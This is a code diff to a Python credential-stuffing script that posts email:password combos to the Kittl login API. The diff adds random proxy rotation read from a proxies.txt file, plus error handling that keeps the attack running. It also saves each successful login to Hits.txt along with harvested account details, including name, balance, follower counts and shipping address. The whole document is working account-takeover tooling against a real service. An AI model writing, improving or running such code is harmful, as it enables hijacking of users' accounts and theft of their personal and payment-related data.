@@ -1,6 +1,7 @@
 import requests
 import json
 import threading
+import random
 from parser_kittl import parse_using_re
 
 class Color:
@@ -10,8 +11,15 @@ class Color:
     green_bold = "\033[1;92m"
     red_bold = "\033[1;91m"
     yellow_bold = "\033[1;33m"
+    
 
-def brutter(user, password):
+proxy = set()
+with open("proxies.txt","r", encoding='utf-8') as pfile:
+    lines = pfile.readlines()
+    for line in lines:
+        proxy.add(line.strip())
+
+def brutter(user, password, proxies):
     data = {
         "email": user,
         "password": password
@@ -22,7 +30,7 @@ def brutter(user, password):
     }
 
     url = "https://api.kittl.com/sessions/create"
-    response = requests.post(url, json=data, headers=headers)
+    response = requests.post(url, json=data, headers=headers, proxies=proxies)
     if response.status_code == 201:
         content_type = response.headers.get("Content-Type", "")
         if "application/json" in content_type:
@@ -41,8 +49,10 @@ def brutter(user, password):
         createdAt = parse_using_re(data, "createdAt")
         address = parse_using_re(data, "shippingAddress")
 
-        
-        #print(f"{user}:{password} | Name:{name},Followers:{followers},Following:{following},Balance:{balance},Designs:{designCount},CreatedAt:{createdAt},Address:{address} |")
+        with open("Hits.txt", 'a', encoding='utf-8') as hits:
+            hits.write(f"{user}:{password} | Name:{name},Followers:{followers},Following:{following},Balance:{balance},Designs:{designCount},CreatedAt:{createdAt},Address:{address} |")
+            hits.write("\n")
+
         print(f"{Color.green_bold}{user}:{password}{Color.no_colored}")
     elif response.status_code == 500:
         print(f"{Color.red_bold}Response [500] , SERVER DOWN .{Color.no_colored}")
@@ -51,12 +61,18 @@ def brutter(user, password):
         print(f"{Color.blue_bold}{user}:{password}{Color.no_colored}")
 
 def process_combo(combo):
+    proxies = {
+        'http': 'http://' + random.choice(list(proxy))
+    }
     parts = combo.strip().split(":")
-    if len(parts) == 2:
-        user = parts[0]
-        password = parts[1]
-        brutter(user, password)
-    else:
+    try:
+        if len(parts) == 2:
+            user = parts[0]
+            password = parts[1]
+            brutter(user, password, proxies)
+        else:
+            pass
+    except requests.exceptions.RequestException as e:
         pass
 
 if __name__ == "__main__":
